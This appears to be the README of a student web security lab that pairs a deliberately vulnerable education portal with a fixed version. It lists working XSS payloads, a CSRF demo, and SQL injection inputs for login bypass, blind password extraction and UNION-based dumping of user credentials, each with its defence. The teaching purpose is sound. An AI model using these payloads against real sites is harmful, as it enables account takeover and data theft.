# CampusHub Web Security Lab

Part 2 of Information Security Practical Assignment 2.

**Group:** Muhammad Ibrahim (23F-0590), Muhammad Siddique (23F-0669).

CampusHub is a database-backed education portal with course search, student login, enrollment lookup, course discussion, a browser-side study planner, and profile email updates. The same application has two explicit versions with independent SQLite databases: `/vulnerable` and `/safe`.

## Run

Python 3.10 or newer is the only application dependency. No framework, database service, API keys, npm installation, or internet connection is needed to run it.

```powershell
python app.py
# On this computer, if the Python launcher fails:
./run.ps1
```

Open http://localhost:8000/safe or http://localhost:8000/vulnerable. If PowerShell blocks scripts, run:

```powershell
& 'C:\Users\ibrah\AppData\Local\Programs\Python\Python314\python.exe' app.py
```

In another terminal, start the external CSRF page:

```powershell
python app.py --attacker
```

Demo logins: `student / StudentPass!26` and `admin / AdminPass!26`. All records and credentials are fictional lab data. Safe passwords are salted PBKDF2-HMAC-SHA256 hashes. Vulnerable passwords are intentionally plaintext to demonstrate extraction. Stop the main server before `python app.py --reset` to restore both databases; this command starts the server after resetting. Sessions are in memory and disappear on restart.

## Demonstrations and fixes

| Requirement | Vulnerable implementation | Safe defense |
|---|---|---|
| Reflected XSS | Raw query text in the search summary | HTML output encoding and CSP |
| Stored XSS | Stored discussion body rendered as HTML | Store text, encode on output and CSP |
| DOM XSS | URL fragment assigned to `innerHTML` | `textContent` and CSP |
| CSRF | Authenticated email POST without token or origin verification | Session-bound random token, exact Origin validation, SameSite=Lax cookie |
| Easy SQLi | Concatenated login query | Bound parameter and password-hash verification |
| Intermediate SQLi | Enrollment lookup exposes a boolean result for injected conditions | Parameterized reference lookup |
| Advanced SQLi | Course search allows ORDER BY discovery and UNION extraction | Parameterized LIKE query |

SQLite uses `sqlite_master`, `pragma_database_list`, and `pragma_table_info` instead of MySQL's `information_schema`. These query actual database metadata; no stages or results are simulated.

## Payloads and manual viva steps

Use only the local lab. Payloads below are inputs to forms, not JavaScript pasted into DevTools. `onload` changes the visible search heading so execution remains visible in screenshots.

### Reflected XSS

Paste into course search, first on vulnerable and then safe:

```html
<svg onload="document.getElementById(`search-summary`).textContent=`REFLECTED XSS EXECUTED`"></svg>
```

Vulnerable: the summary changes. Safe: the payload is shown as text, with no execution.

### Stored XSS

Log in as student and submit this discussion message on each version:

```html
<svg onload="this.parentElement.innerHTML='<strong>STORED XSS EXECUTED</strong>'"></svg>
```

Refresh or visit the vulnerable discussion as a guest in another browser context. The payload is loaded from SQLite and executes again. Safe shows the literal message.

### DOM XSS

Paste this into the study planner and click Preview note:

```html
<img src=x onerror="document.getElementById('note-preview').textContent='DOM XSS EXECUTED'">
```

The payload exists only in the URL fragment, which browsers do not send to the server. Vulnerable executes; safe renders text.

### CSRF

1. Log in at `http://localhost:8000/vulnerable/login` and confirm the profile email.
2. Navigate to `http://127.0.0.1:8001/vulnerable`. Its form automatically posts `email=attacker@lab.invalid` to the authenticated localhost profile, without a token.
3. Confirm the persisted email changed. The vulnerable cookie deliberately omits SameSite: modern browsers permit the cross-site top-level POST for a newly issued cookie during their approximately two-minute default-cookie grace window. Run the demo immediately after login. This is a real browser behavior, not cookie spoofing.
4. Repeat immediately after logging in to the safe version, using `http://127.0.0.1:8001/safe`. Explicit SameSite=Lax withholds the cookie and no change occurs. Log back in and verify the original email. Live HTTP tests separately establish that even a request carrying the cookie is rejected without a valid token and trusted Origin.

The attacker uses a different site and origin (`127.0.0.1:8001`) from the target (`localhost:8000`). Different ports alone would be different origins but would not be different sites.

### Easy SQL injection

Login username: `admin' -- `; password: `wrong`.

Vulnerable logs in as administrator. Safe rejects the credentials.

### Intermediate boolean SQL injection

Enrollment reference inputs:

```sql
ENR-2026-001' AND 1=1 -- 
ENR-2026-001' AND 1=2 -- 
ENR-2026-001' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='A' -- 
ENR-2026-001' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='Z' -- 
```

Vulnerable returns found/not found and leaks that the first password character is A. The password itself is not displayed by the lookup. Safe returns no matching enrollment for all four literal inputs.

### Advanced SQL injection

Submit each in order in course search. SQL comments must retain the space after `--`.

```sql
' ORDER BY 3 -- 
' ORDER BY 4 -- 
' UNION SELECT 'DATABASE',name,file FROM pragma_database_list -- 
' UNION SELECT 'TABLE',name,sql FROM sqlite_master WHERE type='table' -- 
' UNION SELECT 'COLUMN',name,type FROM pragma_table_info('users') -- 
' UNION SELECT username,password,email FROM users -- 
```

ORDER BY 3 succeeds; ORDER BY 4 fails, establishing three result columns. Next, enumerate the database, table names and definitions, then the users columns, then extract the demo usernames, passwords and email addresses. Safe treats each input as a search string and returns no courses.

## Verification

Start the main server, then run `python tests/test_security.py` for live HTTP regression checks. Browser verification and screenshots are generated with `node tests/browser_evidence.cjs` after installing the development-only Playwright package (`npm install --no-save playwright`) and a Chromium browser (`npx playwright install chromium`). Application users do not need either dependency. Browser assertions check actual script execution, its absence in safe mode, persisted CSRF results, SQLi responses, and successful normal operations.

Screenshots and the Part 2 Word report are in `submission/`. The report contains the working payloads, attack explanations, fixes and matching evidence. See `submission/verification.json` for the recorded browser assertions.

## Submission and commit history

Repository: https://github.com/ibrahimwarraich101/is-webSecurity. The assignment PDF is excluded from the project repository. Keep genuine development commits; do not backdate or invent commits. Instructor approval is needed for the two-member group because the brief specifies three students. The PDF's marking rows add up to 110 although its Part 2 total says 100; this project covers every listed requirement.

## Security references

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

This intentionally insecure server binds to loopback. It is a teaching lab, not a production service. Safe mode addresses the assignment's attack set; it does not claim a production audit. Production deployment would additionally require HTTPS/Secure cookies, session expiry, rate limiting, access-control policy and operational monitoring.
